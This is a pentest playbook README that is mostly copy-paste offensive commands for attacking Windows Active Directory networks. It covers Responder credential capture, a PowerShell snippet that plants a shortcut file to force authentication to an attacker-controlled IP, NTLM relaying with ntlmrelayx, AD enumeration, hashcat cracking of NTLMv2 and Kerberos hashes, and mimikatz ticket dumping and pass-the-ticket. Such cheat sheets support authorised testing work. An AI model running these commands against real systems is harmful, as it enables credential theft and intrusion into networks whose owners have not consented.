# Gunnajs-Playbook
How to pentest like a Gunnaj

## Tools bby

### linWinPwn - Active Directory Vulnerability Scanner
https://github.com/lefayjey/linWinPwn
### BloodHound
https://github.com/fox-it/BloodHound.py
### mimikatz
https://github.com/ParrotSec/mimikatz
### Responder
https://github.com/lgandx/Responder
### breach-parse
https://github.com/hmaverickadams/breach-parse
### PRET
https://github.com/RUB-NDS/PRET

## Wordlists bby
### Create your own wordlist
https://zzzteph.github.io/weakpass/
### Top 10 million
https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt (8.1 MB)

### Crackstation
https://crackstation.net/files/crackstation.txt.gz (14.6 GB)


### Large p-list
https://download.g0tmi1k.com/wordlists/large/36.4GB-18_in_1.lst.7z (48.4 GB)

### Rockyou2021

https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)

# VEV
## Responder
### Kickstart responder
```bash
responder -I eth0 -v
```

### Responder linkifle

#### In Powershell, use each command to create a linkfile for Responder
```bash
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\Users\<User>\Desktop\<name>.lnk")
$lnk.TargetPath = "\\<ResponderIP>\@threat.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

### Crackmapexec NTLM-relay
#### Evaluate no smb-signing
```bash
crackmapexec smb <IPs> --gen-relay-list <output.txt>
```
#### NTLMRelayx
```bash
sudo python3 ntlmrelayx.py -smb2support -tf
```
#### Disbale SMB and HTTP in Responder.conf
```bash
[Responder Core]

; Servers to start
SQL = On
SMB = Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = Off
DNS = On
LDAP = On
DCERPC = On
WINRM = On
SNMP = Off
```

## Nmap
#### Scan for Version, OS-type and all open ports to a file
```bash
sudo nmap -sV -O -p- <IP/mask> > file.txt
```
## linWinPwn 
### With AD-user
```bash
sudo ./linWinPwn.sh -t <Domain_Controller_IP> -u <AD_user> -p <AD_password> -o <output_dir>
```
### With Hash
```bash 
sudo ./linWinPwn.sh -t <Domain_Controller_IP> -u <AD_user> -p <./krb5cc_ticket> -o <output_dir>
```
### With kerbticket
```bash 
sudo ./linWinPwn.sh -t <Domain_Controller_IP> -u <AD_user> -p <LMHASH:NTHASH> -o <output_dir>
```

## BloodHound Dump on Linux (can be wonky)
```bash
./bloodhound.py -c All -u <AD_user> -p <AD_password> -dc <domain controller domain name> -d <domain name>

```
## SMB VEV
### Mount share
```bash
sudo mount.cifs <//ip/folder> <./folder> -o user=<username>,password=<password>,dom=<domain.com>
```
### Unmount share
```bash
sudo umount <./folder>
```
### Search for keywords in files
```bash
grep -i <keyword> *
```
## PRET
### Nmap printers
```bash
nmap -p 9100 IP/mask
```
```bash
pret.py target {ps,pjl,pcl}
```
## Zero Logon
* in the making 

### Crack NTLMv2 hashes
```bash
hashcat64.exe -m 5600 ntlm-hashes.txt <passlist.txt> -o cracked.txt
```
### Crack kerberos hashes
```bash
hashcat64.exe -m 13100 krb5tgs-hashes.txt <passlist.txt> -o cracked.txt
```
## Mimikatz
### Dump tickets
```bash
mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```
### Pass the ticket
```bash
mimikatz.exe
kerberos::ptt <ticket>
klist
```
